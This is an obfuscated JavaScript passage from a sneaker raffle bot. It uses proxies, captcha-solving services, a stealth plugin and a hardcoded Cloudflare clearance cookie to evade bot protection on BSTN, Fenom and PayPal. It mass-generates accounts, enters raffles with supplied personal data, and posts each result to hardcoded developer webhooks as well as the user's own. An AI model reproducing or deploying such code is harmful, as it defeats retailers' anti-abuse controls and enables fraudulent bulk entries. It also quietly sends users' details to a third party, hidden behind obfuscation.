            _0x26313b != 'ver' && console['log'](_0x1e4ea5() + '\x20[' + _0x4917b3['name'] + ']\x20Task\x20' + (_0x145998 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x353b6e['data']['attributes']['email']), _0x19b48a(_0x55e3c7, callback);
        } catch (_0x3e07f3) {
            console['log'](_0x1e4ea5() + '\x20Task\x20' + (_0x145998 + 0x1) + ':\x20' + _0x3e07f3);
        }
    });
}
;
async function _0x4b6c5f(_0x3ce391, _0x5a7cbe, _0x97fc79) {
    var _0x15176e;
    _0x57f604('' + _0x5a7cbe);
    var _0x33ca6e = _0x97fc79[0x0]['split'](':');
    const _0x59682e = await _0x4efd86['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x33ca6e[0x0] + ':' + _0x33ca6e[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x1e4ea5() + '\x20[' + _0x5a7cbe + ']\x20Getting\x20Session');
        const _0x26ab44 = JSON['parse'](_0x550d6b['readFileSync']('sessions/log.json')), _0x28af50 = await _0x59682e['newPage']();
        await _0x28af50['authenticate']({
            'username': '' + _0x33ca6e[0x2],
            'password': '' + _0x33ca6e[0x3]
        }), await _0x28af50['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x28af50, await _0x28af50['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x1e4ea5() + '\x20[' + _0x5a7cbe + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x28af50['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x1e4ea5() + '\x20[' + _0x5a7cbe + ']\x20Successfully\x20logged\x20in'), await _0x491ae3(0x2710), _0x15176e = await _0x28af50['cookies'](), _0x550d6b['writeFileSync']('sessions/log.json', '' + JSON['stringify'](_0x15176e));
        } catch (_0x2bdcf6) {
            throw new Error('Login\x20session\x20expired\x20' + _0x2bdcf6);
        }
        for (var _0x5012d6 = 0x0; _0x5012d6 < _0x3ce391['length']; _0x5012d6++) {
            console['log'](_0x1e4ea5() + '\x20[' + _0x5a7cbe + ']\x20Task\x20' + (_0x5012d6 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x57f604(_0x5a7cbe + '\x20Task\x20' + (_0x5012d6 + 0x1) + '\x20/\x20' + _0x3ce391['length']);
            const _0xe47b71 = await _0x59682e['newPage']();
            await _0xe47b71['goto']('' + _0x3ce391[_0x5012d6], { 'waitUntil': 'networkidle2' }), await _0x491ae3(0xbb8);
            try {
                const _0x2c550f = await _0xe47b71['$']('#challenge-heading');
                _0x2c550f && (console['log'](_0x1e4ea5() + '\x20[' + _0x5a7cbe + ']\x20Task\x20' + (_0x5012d6 + 0x1) + '\x20:\x20' + _0x1818b9['yellow']('2FA\x20Required')), await _0xe47b71['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x491ae3(0x61a8), await _0xe47b71['waitForSelector']('#payment-submit-btn'), await _0xe47b71['$eval']('#payment-submit-btn', _0x3d9ceb => _0x3d9ceb['click']()), await _0xe47b71['click']('#payment-submit-btn');
                try {
                    await _0xe47b71['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x491ae3(0x5dc), console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0x5a7cbe + ']\x20Task\x20' + (_0x5012d6 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x10de50) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x10de50['message']);
                } finally {
                    await _0xe47b71['close'](), await _0x491ae3(0x4650);
                }
            } catch (_0x91ae35) {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x5a7cbe + ']\x20Task\x20' + (_0x5012d6 + 0x1) + '\x20:\x20' + _0x91ae35));
            }
        }
    } catch (_0x55f1eb) {
        console['log'](_0x1818b9['red']('' + _0x55f1eb));
    } finally {
        await _0x59682e['close']();
    }
}
async function _0x4daae3(_0xc44f0c, _0x5728a5, _0x5712fb) {
    _0x4efd86['use'](_0x202680()), _0x4efd86['use'](_0x1fedc1({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x401d1c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2341b0 = 0x0; _0x2341b0 < _0xc44f0c['length']; _0x2341b0++) {
        var _0x378906;
        await _0x238b3c(_0xc44f0c, _0x2341b0), _0x57f604(_0x5712fb['name'] + '\x20Task\x20' + (_0x2341b0 + 0x1) + '\x20/\x20' + _0xc44f0c['length'] + '\x20||\x20File:\x20' + _0xb37a88 + '\x20Proxies:\x20' + _0x39f01a);
        var _0x4996b6 = await _0x344cc9(_0xc44f0c[_0x2341b0], _0x5712fb, 'acc', ![]);
        const _0x2562dd = { 'succesDEVMSG': { 'embeds': [_0x4996b6] } }, _0x4f7218 = 'https://www.bstn.com/eu_en/customer/account/';
        var _0x3397a3 = Math['round'](Math['random']() * (_0x5728a5['length'] - 0x1)), _0x3a572a = _0x5728a5[_0x3397a3]['split'](':');
        const _0x1efa7e = await _0x4efd86['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x3a572a[0x0] + ':' + _0x3a572a[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--force-device-scale-factor=0.3'
            ]
        });
        try {
            const _0x177f1d = await _0x1efa7e['newPage']();
            await _0x177f1d['authenticate']({
                'username': '' + _0x3a572a[0x2],
                'password': '' + _0x3a572a[0x3]
            }), console['log'](_0x1e4ea5() + '\x20[' + _0x5712fb['name'] + ']\x20Task\x20' + (_0x2341b0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x177f1d['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x177f1d['setRequestInterception'](!![]), _0x177f1d['on']('request', _0x1158d2 => {
                _0x1158d2['resourceType']() === 'image' ? _0x1158d2['abort']() : _0x1158d2['continue']();
            }), await _0x177f1d['goto']('' + _0x4f7218), await _0x177f1d['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x177f1d['click']('button[class=\x22cf2Lf6\x22]'), await _0x177f1d['waitForSelector']('a.action.create.primary.social-login'), console['log'](_0x1e4ea5() + '\x20[' + _0x5712fb['name'] + ']\x20Task\x20' + (_0x2341b0 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x491ae3(0x7d0), await _0x177f1d['click']('a.action.create.primary.social-login'), await _0x491ae3(0x7d0), await _0x177f1d['click']('button.button.dashboard-actions-toolbar__item'), console['log'](_0x1e4ea5() + '\x20[' + _0x5712fb['name'] + ']\x20Task\x20' + (_0x2341b0 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x491ae3(0x190), await _0x177f1d['type']('#firstname', _0xc44f0c[_0x2341b0]['FirstName'], { 'delay': 0xf0 }), await _0x491ae3(0x190), await _0x177f1d['type']('#lastname', _0xc44f0c[_0x2341b0]['LastName'], { 'delay': 0xe6 }), await _0x491ae3(0x190), await _0x177f1d['type']('#bss_email_address', _0xc44f0c[_0x2341b0]['Email'], { 'delay': 0x122 }), await _0x491ae3(0x190), await _0x177f1d['type']('#password', _0xc44f0c[_0x2341b0]['Password'], { 'delay': 0x1e0 }), console['log'](_0x1e4ea5() + '\x20[' + _0x5712fb['name'] + ']\x20Task\x20' + (_0x2341b0 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x491ae3(0x2bc), await _0x177f1d['click']('#bt-social-create'), await _0x177f1d['click']('#bt-social-create'), await _0x491ae3(0x1388);
            const _0x201079 = await _0x177f1d['$']('#bss_email_address-error');
            if (_0x201079)
                throw new Error('Invalid\x20Email');
            const _0x338906 = await _0x177f1d['$']('#password-error');
            if (_0x338906)
                throw new Error('Invalid\x20Password');
            await _0x177f1d['waitForSelector']('div.mesg-success'), console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0x5712fb['name'] + ']\x20Task\x20' + (_0x2341b0 + 0x1) + '\x20:\x20Account\x20' + _0xc44f0c[_0x2341b0]['Email'] + '\x20Generated')), _0x550d6b['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0xc44f0c[_0x2341b0]['Email'] + ',' + _0xc44f0c[_0x2341b0]['Password']);
            try {
                _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x2562dd['succesDEVMSG']);
            } catch {
            }
            await _0xafb19d(_0x3cac51, _0x2562dd['succesDEVMSG']), console['log'](_0x1818b9['yellow'](_0x1e4ea5() + '\x20[' + _0x5712fb['name'] + ']\x20Task\x20' + (_0x2341b0 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20verify'));
        } catch (_0x172842) {
            console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x5712fb['name'] + ']\x20Task\x20' + (_0x2341b0 + 0x1) + '\x20:\x20' + _0x172842)), _0x378906 = '' + _0x172842;
            var _0x339b86 = await _0x344cc9(_0xc44f0c[_0x2341b0], _0x5712fb, 'acc', !![], _0x378906);
            _0x2562dd['errorDEV'] = { 'embeds': [_0x339b86] }, _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x2562dd['errorDEV']), await _0xafb19d(_0x51c252, _0x2562dd['errorDEV']);
        } finally {
            _0x1efa7e['close'](), console['log'](_0x1e4ea5() + '\x20[' + _0x5712fb['name'] + ']\x20Waiting\x20for\x20' + _0x401d1c['delay'] + '\x20ms'), await _0x491ae3(_0x401d1c['delay']);
        }
    }
}
async function _0x452980(_0x537812, _0x48d4a2, _0x436511) {
    _0x4efd86['use'](_0x202680());
    for (var _0x1ce1cd = 0x0; _0x1ce1cd < _0x537812['length']; _0x1ce1cd++) {
        var _0x1d97c7 = Math['round'](Math['random']() * (_0x48d4a2['length'] - 0x1)), _0x266c85 = _0x48d4a2[_0x1d97c7]['split'](':');
        const _0x29f015 = await _0x4efd86['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x266c85[0x0] + ':' + _0x266c85[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x37dfa4 = await _0x29f015['newPage']();
            await _0x37dfa4['authenticate']({
                'username': '' + _0x266c85[0x2],
                'password': '' + _0x266c85[0x3]
            }), console['log'](_0x1e4ea5() + '\x20[' + _0x436511['name'] + ']\x20Task\x20' + (_0x1ce1cd + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x37dfa4['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x37dfa4['setRequestInterception'](!![]), _0x37dfa4['on']('request', _0x305304 => {
                _0x305304['resourceType']() === 'image' || _0x305304['resourceType']() === 'font' || _0x305304['resourceType']() === 'media' ? _0x305304['abort']() : _0x305304['continue']();
            }), console['log'](_0x1e4ea5() + '\x20[' + _0x436511['name'] + ']\x20Task\x20' + (_0x1ce1cd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x37dfa4['goto'](_0x537812[_0x1ce1cd]), console['log'](_0x1e4ea5() + '\x20[' + _0x436511['name'] + ']\x20Task\x20' + (_0x1ce1cd + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x37dfa4['waitForTimeout'](0xbb8);
            try {
                await _0x37dfa4['waitForSelector']('.dashboard-main_title'), console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0x436511['name'] + ']\x20Task\x20' + (_0x1ce1cd + 0x1) + '\x20:\x20Verification\x20Successful'));
                var _0x14df88 = await _0x344cc9(null, _0x436511, 'ver', ![]);
                const _0x42f468 = { 'succesDEVMSG': { 'embeds': [_0x14df88] } };
                await _0xafb19d(_0x35897b, _0x42f468['succesDEVMSG']);
            } catch (_0x31e9a0) {
                throw new Error(_0x31e9a0);
            }
        } catch (_0x42af46) {
            console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x436511['name'] + ']\x20Task\x20' + (_0x1ce1cd + 0x1) + '\x20:\x20' + _0x42af46));
            var _0x418d1e = _0x42af46, _0x55556b = await _0x344cc9(null, _0x436511, 'ver', !![], _0x418d1e);
            const _0x2e01c0 = { 'errorDEVMSG': { 'embeds': [_0x55556b] } };
            _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x2e01c0['errorDEVMSG']), await _0xafb19d(_0x51c252, _0x2e01c0['errorDEVMSG']);
        } finally {
            _0x29f015['close'](), console['log'](_0x1e4ea5() + '\x20[' + _0x436511['name'] + ']\x20Waiting\x20for\x20' + _0x401d1c['delay'] + '\x20ms'), await _0x491ae3(_0x401d1c['delay']);
        }
    }
}
async function _0x2194b5(_0x7e31a9, _0x3e263d, _0x37e397) {
    _0x4efd86['use'](_0x202680()), _0x4efd86['use'](_0x1fedc1({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x401d1c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x40362d = 0x0; _0x40362d < _0x7e31a9['length']; _0x40362d++) {
        var _0x2a531e;
        await _0x238b3c(_0x7e31a9, _0x40362d), _0x57f604(_0x37e397['name'] + '\x20Task\x20' + (_0x40362d + 0x1) + '\x20/\x20' + _0x7e31a9['length'] + '\x20||\x20File:\x20' + _0xb37a88 + '\x20Proxies:\x20' + _0x39f01a);
        var _0x3e03bb = Math['round'](Math['random']() * (_0x3e263d['length'] - 0x1)), _0x1c3594 = _0x3e263d[_0x3e03bb]['split'](':'), _0x288965;
        try {
            _0x288965 = await _0x4efd86['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x1c3594[0x0] + ':' + _0x1c3594[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x288965 = await _0x4efd86['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x1c3594[0x0] + ':' + _0x1c3594[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x405286 = await _0x288965['newPage'](), _0x3afa81 = await _0x405286['target']()['createCDPSession'](), { windowId: _0x5595d3 } = await _0x3afa81['send']('Browser.getWindowForTarget');
            await _0x405286['setViewport']({
                'width': 0x501,
                'height': 0x2d0
            });
            var _0x10f42e = [{
                'name': 'cf_clearance',
                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                'domain': '.bstn.com',
                'path': '/',
                'expires': 1707818183.331533,
                'httpOnly': !![],
                'secure': !![]
            }];
            await _0x405286['authenticate']({
                'username': '' + _0x1c3594[0x2],
                'password': '' + _0x1c3594[0x3]
            }), console['log'](_0x1e4ea5() + '\x20[' + _0x37e397['name'] + ']\x20Task\x20' + (_0x40362d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x405286['goto']('' + _0x7e31a9[_0x40362d]['Url']), console['log'](_0x1e4ea5() + '\x20[' + _0x37e397['name'] + ']\x20Task\x20' + (_0x40362d + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x405286['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x3afa81['send']('Browser.setWindowBounds', {
                'windowId': _0x5595d3,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x491ae3(0x1388), await _0x405286['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x405286['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x491ae3(0x1f4), console['log'](_0x1e4ea5() + '\x20[' + _0x37e397['name'] + ']\x20Task\x20' + (_0x40362d + 0x1) + '\x20:\x20Logging\x20in'), await _0x405286['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x117d02 => _0x117d02['click']()), await _0x405286['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x405286['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x491ae3(0x7d0), await _0x405286['waitForSelector']('#email-login'), await _0x405286['type']('#email-login', '' + _0x7e31a9[_0x40362d]['Email']), await _0x491ae3(0x1f4), await _0x405286['waitForSelector']('#password'), await _0x405286['type']('#password', '' + _0x7e31a9[_0x40362d]['Password']), await _0x491ae3(0x1f4);
            try {
                await _0x405286['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x43c22e => _0x43c22e['click']()), await _0x405286['click']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]');
            } catch {
            }
            try {
                await _0x405286['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
            } catch (_0x23a7b8) {
            }
            await _0x491ae3(0x3e8);
            const _0x21613d = await _0x405286['$']('.enteredDraw_container__2KmQ_');
            if (_0x21613d)
                throw new Error('Duplicate\x20Entry');
            console['log'](_0x1e4ea5() + '\x20[' + _0x37e397['name'] + ']\x20Task\x20' + (_0x40362d + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x7e31a9[_0x40362d]['Size']);
            if (_0x7e31a9[_0x40362d]['Size'] != 'RANDOM') {
                var _0x17124c = _0x7e31a9[_0x40362d]['Size']['replace']('.', ',');
                const _0x36a8e6 = await _0x405286['$x']('//div[contains(text(),\x20' + _0x17124c + ')]');
                await _0x36a8e6[0x0]['click']();
            } else {
                const _0x14bbcf = await _0x405286['$$']('div.swatchTile_tile__IRH9Q');
                var _0x30d710 = Math['round'](Math['random']() * (_0x14bbcf['length'] - 0x1));
                await _0x14bbcf[_0x30d710]['click']();
            }
            await _0x491ae3(0x1f4);
            const _0xb6f2fb = await _0x405286['$']('.addressList_addressItem__LE2PB');
            if (_0xb6f2fb) {
            } else
                console['log'](_0x1e4ea5() + '\x20[' + _0x37e397['name'] + ']\x20Task\x20' + (_0x40362d + 0x1) + '\x20:\x20Filling\x20Address'), await _0x405286['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x491ae3(0x5dc), await _0x405286['waitForSelector']('#firstname'), await _0x405286['type']('#firstname', '' + _0x7e31a9[_0x40362d]['FirstName']), await _0x491ae3(0x1f4), await _0x405286['waitForSelector']('#firstname'), await _0x405286['type']('#lastname', '' + _0x7e31a9[_0x40362d]['LastName']), await _0x491ae3(0x1f4), await _0x405286['waitForSelector']('#firstname'), await _0x405286['type']('#street', '' + _0x7e31a9[_0x40362d]['Address1']), await _0x491ae3(0x1f4), await _0x405286['waitForSelector']('#firstname'), await _0x405286['type']('#houseNumber', _0x7e31a9[_0x40362d]['HouseNumber'] + '\x20' + _0x7e31a9[_0x40362d]['Address2']), await _0x491ae3(0x1f4), await _0x405286['waitForSelector']('#firstname'), await _0x405286['select']('#country_code', '' + _0x7e31a9[_0x40362d]['Country']), await _0x491ae3(0x1f4), await _0x405286['type']('#postcode', '' + _0x7e31a9[_0x40362d]['Zip']), await _0x491ae3(0x1f4), await _0x405286['type']('#city', '' + _0x7e31a9[_0x40362d]['City']), await _0x491ae3(0x1f4), await _0x405286['type']('#telephone', '' + _0x7e31a9[_0x40362d]['Phone']), await _0x491ae3(0x1f4), await _0x405286['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
            await _0x491ae3(0x9c4);
            try {
                await _0x405286['type']('#instagram_name', '' + _0x7e31a9[_0x40362d]['Follower']), await _0x405286['click']('.note_groupBtn__WLDwH\x20>\x20button');
            } catch {
            }
            console['log'](_0x1e4ea5() + '\x20[' + _0x37e397['name'] + ']\x20Task\x20' + (_0x40362d + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x491ae3(0x5dc), await _0x405286['click']('.checkBox_boxHolder__wLGVe'), await _0x491ae3(0x1f4), await _0x405286['click']('.termConditions_TC__hll9k\x20>\x20button'), await _0x491ae3(0x1388), await _0x405286['waitForSelector']('.success_msg__2HjJY'), console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0x37e397['name'] + ']\x20Task\x20' + (_0x40362d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            var _0x2e75f2 = await _0x344cc9(_0x7e31a9[_0x40362d], _0x37e397, 'dev', ![]), _0x4dc522 = await _0x344cc9(_0x7e31a9[_0x40362d], _0x37e397, 'pub', ![]);
            const _0x17d1fb = {
                'succesDEVMSG': { 'embeds': [_0x2e75f2] },
                'succesPUBMSG': { 'embeds': [_0x4dc522] }
            };
            try {
                _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x17d1fb['succesDEVMSG']), await _0x491ae3(0xc8), await _0xafb19d(_0xc8def8, _0x17d1fb['succesDEVMSG']), await _0x491ae3(0xc8), await _0xafb19d(_0x45ab34, _0x17d1fb['succesPUBMSG']);
            } catch (_0x11ece7) {
                console['log'](_0x1818b9['yellow'](_0x1e4ea5() + '\x20[' + _0x37e397['name'] + ']\x20Task\x20' + (_0x40362d + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x11ece7));
            }
        } catch (_0x199c2b) {
            console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x37e397['name'] + ']\x20Task\x20' + (_0x40362d + 0x1) + '\x20:\x20' + _0x199c2b)), _0x2a531e = '' + _0x199c2b;
            var _0x5b241d = await _0x344cc9(_0x7e31a9[_0x40362d], _0x37e397, 'dev', !![], _0x2a531e), _0x2e75f2 = await _0x344cc9(_0x7e31a9[_0x40362d], _0x37e397, 'dev', ![]), _0x4dc522 = await _0x344cc9(_0x7e31a9[_0x40362d], _0x37e397, 'pub', ![]);
            const _0x147d59 = {
                'succesDEVMSG': { 'embeds': [_0x2e75f2] },
                'succesPUBMSG': { 'embeds': [_0x4dc522] }
            };
            _0x147d59['errorDEV'] = { 'embeds': [_0x5b241d] }, _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x147d59['errorDEV']), await _0xafb19d(_0x51c252, _0x147d59['errorDEV']);
        } finally {
            _0x288965['close'](), console['log'](_0x1e4ea5() + '\x20[' + _0x37e397['name'] + ']\x20Waiting\x20for\x20' + _0x401d1c['delay'] + '\x20ms'), await _0x491ae3(_0x401d1c['delay']);
        }
    }
}
async function _0xa1d532(_0x2475ac, _0x19089c, _0x292fbe) {
    _0x4efd86['use'](_0x202680()), _0x4efd86['use'](_0x1fedc1({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x401d1c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x71ceba = 0x0; _0x71ceba < _0x2475ac['length']; _0x71ceba++) {
        var _0xca41a = '', _0x54de4e = 0x0, _0x30275c;
        await _0x238b3c(_0x2475ac, _0x71ceba), _0x57f604(_0x292fbe['name'] + '\x20Task\x20' + (_0x71ceba + 0x1) + '\x20/\x20' + _0x2475ac['length'] + '\x20||\x20File:\x20' + _0xb37a88 + '\x20Proxies:\x20' + _0x39f01a);
        var _0x23c55f = await _0x344cc9(_0x2475ac[_0x71ceba], _0x292fbe, 'acc', ![]);
        const _0x1d2156 = { 'succesDEVMSG': { 'embeds': [_0x23c55f] } }, _0x25899c = 'https://www.fenom.com/en/authentication?create_account=1';
        var _0x2b4e7c = Math['round'](Math['random']() * (_0x19089c['length'] - 0x1)), _0x237d37 = _0x19089c[_0x2b4e7c]['split'](':'), _0x30ea90;
        try {
            _0x30ea90 = await _0x4efd86['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x237d37[0x0] + ':' + _0x237d37[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x30ea90 = await _0x4efd86['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x237d37[0x0] + ':' + _0x237d37[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x4a7f67 = await _0x30ea90['newPage']();
            await _0x4a7f67['setViewport']({
                'width': 0x500 + _0x15dd0d(0x1, 0x32),
                'height': 0x2d9 + _0x15dd0d(0x1, 0x32)
            });
            const _0x57ae16 = await _0x4a7f67['target']()['createCDPSession'](), { windowId: _0x316b8c } = await _0x57ae16['send']('Browser.getWindowForTarget');
            await _0x4a7f67['authenticate']({
                'username': '' + _0x237d37[0x2],
                'password': '' + _0x237d37[0x3]
            }), console['log'](_0x1e4ea5() + '\x20[' + _0x292fbe['name'] + ']\x20Task\x20' + (_0x71ceba + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4a7f67['goto']('' + _0x25899c, { 'waitUntil': 'networkidle2' }), await _0x491ae3(0x1388), console['log'](_0x1e4ea5() + '\x20[' + _0x292fbe['name'] + ']\x20Task\x20' + (_0x71ceba + 0x1) + '\x20:\x20Solving\x20Cloudflare');
            try {
                const _0x246266 = await _0x4a7f67['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                _0x246266 && await _0x246266['click']();
            } catch {
            }
            await _0x57ae16['send']('Browser.setWindowBounds', {
                'windowId': _0x316b8c,
                'bounds': { 'windowState': 'minimized' }
            });
            try {
                await _0x4a7f67['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x491ae3(0xfa0);
            } catch {
                throw new Error('Blocked\x20by\x20cloudflare');
            }
            console['log'](_0x1e4ea5() + '\x20[' + _0x292fbe['name'] + ']\x20Task\x20' + (_0x71ceba + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x4a7f67['type']('input[name=\x22firstname\x22]', '' + _0x2475ac[_0x71ceba]['FirstName']), await _0x491ae3(0x1f4), await _0x4a7f67['type']('input[name=\x22lastname\x22]', '' + _0x2475ac[_0x71ceba]['LastName']), await _0x491ae3(0x1f4), await _0x4a7f67['type']('input[name=\x22email\x22]', '' + _0x2475ac[_0x71ceba]['Email']), await _0x491ae3(0x1f4), await _0x4a7f67['type']('input[name=\x22password\x22]', '' + _0x2475ac[_0x71ceba]['Password']), await _0x491ae3(0x258), await _0x4a7f67['$eval']('input[name=\x22psgdpr\x22]', _0x1f7e00 => _0x1f7e00['click']()), await _0x491ae3(0x1f4), console['log'](_0x1e4ea5() + '\x20[' + _0x292fbe['name'] + ']\x20Task\x20' + (_0x71ceba + 0x1) + '\x20:\x20Sending\x20Request'), await _0x4a7f67['$eval']('#customer-form', _0x3b7b7a => _0x3b7b7a['submit']());
            try {
                await _0x4a7f67['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0x292fbe['name'] + ']\x20Task\x20' + (_0x71ceba + 0x1) + '\x20:\x20Account\x20' + _0x2475ac[_0x71ceba]['Email'] + '\x20Generated')), _0x550d6b['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x2475ac[_0x71ceba]['Email'] + ',' + _0x2475ac[_0x71ceba]['Password']);
                try {
                    _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x1d2156['succesDEVMSG']);
                } catch {
                }
                await _0xafb19d(_0x3cac51, _0x1d2156['succesDEVMSG']);
            } catch (_0x48239d) {
                throw new Error('Account\x20generation\x20failed:\x20' + _0x48239d);
            }
        } catch (_0x56e065) {
            console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x292fbe['name'] + ']\x20Task\x20' + (_0x71ceba + 0x1) + '\x20:\x20' + _0x56e065)), _0x30275c = '' + _0x56e065;
            var _0x2d3549 = await _0x344cc9(_0x2475ac[_0x71ceba], _0x292fbe, 'acc', !![], _0x30275c);
            _0x1d2156['errorDEV'] = { 'embeds': [_0x2d3549] }, _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x1d2156['errorDEV']), await _0xafb19d(_0x51c252, _0x1d2156['errorDEV']), _0xca41a = 'yes';
        } finally {
            _0x30ea90['close']();
            if (_0xca41a == 'yes' && _0x54de4e != 0x5 && _0x30275c != 'Size\x20Not\x20Found') {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x292fbe['name'] + ']\x20Task\x20' + (_0x71ceba + 0x1) + '\x20:\x20Retrying')), _0x71ceba = _0x71ceba - 0x1, _0x54de4e = _0x54de4e + 0x1;
                continue;
            }
            console['log'](_0x1e4ea5() + '\x20[' + _0x292fbe['name'] + ']\x20Waiting\x20for\x20' + _0x401d1c['delay'] + '\x20ms'), await _0x491ae3(_0x401d1c['delay']);
        }
    }
}
